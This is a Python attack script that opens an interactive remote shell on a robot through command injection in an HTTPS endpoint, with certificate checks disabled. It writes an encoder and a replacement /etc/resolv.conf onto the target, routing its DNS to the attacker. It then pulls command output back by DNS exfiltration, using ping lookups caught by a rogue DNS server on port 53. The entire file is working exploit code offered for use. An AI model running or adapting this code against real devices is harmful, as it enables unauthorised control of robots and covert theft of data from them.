#!/usr/local/bin/python3

import binascii
import sys
import urllib.request
import ssl
import http.client
import shlex
import string
import socket

robot_url = ""
robot_ip = ""

# Disable cert validation because the robot has a self-signed cert
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Run a command without automatically sending the output back to us via DNS
def run_command_raw(cmd):
	cmd = "%%%%% " + cmd + " %%%%%"
	req = urllib.request.Request(robot_url + "/asdf", cmd.encode('ascii'))
	try:
		urllib.request.urlopen(req, context=ctx)
	except http.client.BadStatusLine as e:
		pass # Firmware 2.2.0 always returns bad status on unknown endpoints
		
# Run a command and get the output via DNS, then return it
def run_command(cmd):
	cmd = "for line in $(" + cmd + " 2>&1 | ksh /tmp/encode.ksh);do eval 'ping -c 1 $line&';done"
	run_command_raw(cmd)
	return receive_output()

# Use a series of "echo" commands to upload a file to the target
def upload(source, dest):
	with open(source) as f:
		run_command_raw("echo > " + dest)
		content = f.readlines()
		for line in content:
			cmd = "echo " + shlex.quote(line.rstrip()) + " >> " + dest
			run_command_raw(cmd)
			print(cmd)

# Record DNS requests until we get to one that contains "x00" (null byte). Then put them
# in the correct order and decode
def receive_output():
	linesDict = { }
	done = False
	numLines = 0
	while numLines == 0 or len(linesDict) < numLines:
		# Listen for the next request and send an automated reply
		data=""
		addr=""
		try:
			data, addr = udps.recvfrom(1024)
		except:
			data=""
			addr=""
		if data == "" and addr == "":
			print("Timed out. Retrieved " + str(len(linesDict)) + " / " + str(numLines) + " chunks.")
			break
		p = DNSQuery(data)
		udps.sendto(p.response(robot_ip), addr)

		# Need two components: index within lines array, and encoded line
		components = p.domain.split('.')
		if len(components) < 2 or len(components) > 3:
			continue
		index = components[0]
		line = components[1]
	
		# If it contains x00 (null byte), we are done
		idx = line.find("x00")
		if idx > 0:
			# If it has a null byte, this is the last item in the payload, so we know
			# how many total items there are
			numLines = int(index)
			#print("numLines: " + str(numLines))
			line = line[0:idx]
			#done = True

		# Add to records
		linesDict[int(index)] = line
		#print("Len: " + str(len(linesDict)))	
	# Sort our recorded DNS lookups, decode them, and output
	lineKeys = sorted(linesDict)
	s = ""
	for lineKey in lineKeys:
		s += linesDict[lineKey]	
	return decode(s)
		
# Decode a string encoded with "encode.ksh"
def decode(s):
	for i in range(0, len(string.printable)):
		c = string.printable[i]
		cenc = str(binascii.hexlify(c.encode("ascii")), "ascii").upper()#.encode("hex").upper()
		s = s.replace("x"+cenc, c)
	return s
	
# Code for parsing a DNS request packet which I stole from:
# http://code.activestate.com/recipes/491264/
udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udps.settimeout(5)
class DNSQuery:
	def __init__(self, data):
		self.data=data
		self.domain=''
	
		tipo = (data[2] >> 3) & 15   # Opcode bits
		if tipo == 0:                     # Standard query
			ini=12
			lon=data[ini]
			while lon != 0:
				self.domain+=data[ini+1:ini+lon+1].decode("ascii")+'.'
				ini+=lon+1
				lon=data[ini]

	def response(self, ip):
		packet=b''
		if self.domain:
			packet+=self.data[:2] + b'\x81\x80'
			packet+=self.data[4:6] + self.data[4:6] + b'\x00\x00\x00\x00'   # Questions and Answers Counts
			packet+=self.data[12:]                                         # Original Domain Name Question
			packet+=b'\xc0\x0c'                                             # Pointer to domain name
			packet+=b'\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Response type, ttl and resource data length -> 4 bytes
			for part in ip.split('.'):
				packet += bytes( [int(part)] )
			#packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # 4bytes of IP
			
		return packet

def create_resolv_conf(nameserver):
	file = open("./resolv.conf","w") 
	file.write("domain local\n")
	file.write("nameserver " + nameserver + "\n")
	file.write("nameserver 8.8.4.4\nnameserver 159.10.132.223\nnocache on")
	file.close()

if __name__ == "__main__":
	if len(sys.argv) < 3:
		print("Usage: shell.py <robot_ip> <attacker_ip>")
		print("Note: run exploit.sh before using this script.")
		exit(0)
		
	local_ip = sys.argv[2]
	robot_url = "https://" + sys.argv[1] + ":4443"
	robot_ip = sys.argv[1]	

	print("[*] Starting DNS server...")
	try:
		udps.bind(('',53))
	except PermissionError as e:
		print("[-] Failed: you must be root to bind port 53 for rogue DNS server.")
		exit(1)

	print("[*] Uploading encoding script...")
	upload("./encode.ksh", "/tmp/encode.ksh")
	
	print("[*] Uploading resolv.conf...")
	create_resolv_conf(local_ip)
	upload("./resolv.conf", "/etc/resolv.conf")

	print("[*] Ready!\n")
	
	while True:
		cmd = input("# ")
		print(run_command(cmd))
		
	udps.close()
